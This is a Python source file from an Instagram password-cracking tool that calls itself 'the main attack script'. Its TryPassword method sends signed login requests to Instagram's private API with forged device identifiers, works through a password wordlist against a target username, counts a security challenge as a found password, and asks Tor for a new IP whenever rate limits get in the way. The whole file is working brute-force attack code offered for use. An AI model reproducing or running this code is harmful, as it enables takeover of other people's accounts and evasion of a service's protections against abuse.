# The MIT License.
# Copyright (C) 2017 The Future Shell , DeathSec.
#
# @filename    : InstagramPy.py
# @description : creates a new app instance and coordinates with
#                InstagramPySession , InstagramPyReports and InstagramPyCLI.
#                the main attack script.
import uuid
import hmac
import urllib
import json
import hashlib
import curses
from InstagramPyCLI import InstagramPyCLITerminator

class InstagramPy:
    '''
        @cli -> InstagramPyCLI Instance
        @reports -> InstagramPyReports Instance
        @session -> InstagramPySession Instance
    '''

    cli     = None
    terminator_thread = None
    reports = None
    session = None
    verbose = False
    password_found = False
    response= ''
    status  = 'Cracking'

    def __init__(self , cli , reports , session , verbose):
        '''
            __init__:
                - set @cli
                - set @reports
                - set @session
        '''
        self.verbose = verbose
        self.reports = reports
        self.session = session
        if not cli == None:
            self.cli = cli
            self.cli.ResizeScr()
            self.cli.ClearScr()
            self.cli.PaintHeader()
            self.cli.PaintResourceInfo(session.username , session.password_list)
            self.cli.PaintProgressBar('[ ATTACK STATUS ]')
            self.cli.PaintStatusReport(session.CurrentPassword(),
                                       self.status,
                                       session.ip,
                                       self.response,
                                       self.password_found,
                                       verbose
            )
            self.terminator_thread = InstagramPyCLITerminator(self.cli , self.RepaintCLI)
            # self.terminator_thread.start()
            # self.terminator_thread.join()

    def RepaintCLI(self):
        if not self.cli == None:
            self.cli.ResizeScr()
            self.cli.ClearScr()
            self.cli.PaintHeader()
            self.cli.PaintResourceInfo(self.session.username , self.session.password_list)
            self.cli.UpdateProgressBar(self.session.current_line)
            self.cli.PaintStatusReport(self.session.CurrentPassword() ,
                                       self.status ,
                                       self.session.ip ,
                                       self.response ,
                                       self.password_found,
                                       self.verbose
            )
            return True
        return False

    def TryPassword(self):
        if not self.password_found:
            user_hash = hashlib.md5()
            user_hash.update(self.session.username.encode('utf-8') + self.session.CurrentPassword().encode('utf-8'));
            device_hash = hashlib.md5()
            device_hash.update(user_hash.hexdigest().encode('utf-8') + '12345'.encode('utf-8'))
            data = {
                'phone_id'   : str(uuid.uuid4()),
                '_csrftoken' : self.session.magic_cookie,
                'username'   : self.session.username,
                'guid'       : str(uuid.uuid4()),
                'device_id'  : str('android-' + device_hash.hexdigest()[:16]),
                'password'   : self.session.CurrentPassword(),
                'login_attempt_count' : '0'
            }
            r = self.session.bot.post(
                    '{}accounts/login/'.format(self.session.api_url) ,
                    data='ig_sig_key_version={}&signed_body={}.{}'.format(self.session.ig_sig_version,
                    hmac.new(self.session.ig_sig_key.encode('utf-8'), json.dumps(data).encode('utf-8'),
                    hashlib.sha256).hexdigest(),urllib.parse.quote(json.dumps(data)))
            )
            if r.status_code == 200:
                self.password_found = True
                self.RepaintCLI()
                if not self.cli == None:
                    self.cli.UpdateProgressBar(self.session.password_list_length)
                return True
            else:
                self.response = (r.json())['message']
                if self.response == 'challenge_required':
                    self.password_found = True
                    self.RepaintCLI()
                    if not self.cli == None:
                        self.cli.UpdateProgressBar(self.session.password_list_length)
                    return True
                elif self.response == 'The password you entered is incorrect. Please try again.':
                    self.session.UpdateSaveFile()
                    self.session.NextPassword()
                    self.RepaintCLI()
                else:
                    if 'Invalid' not in self.response:
                        self.status = 'Changing IP'
                        self.session.ChangeIPAddress() # signal tor to change ip 
                        self.RepaintCLI()
                    else:
                        self.session.NextPassword()
        else:
            self.password_found = True
            return True

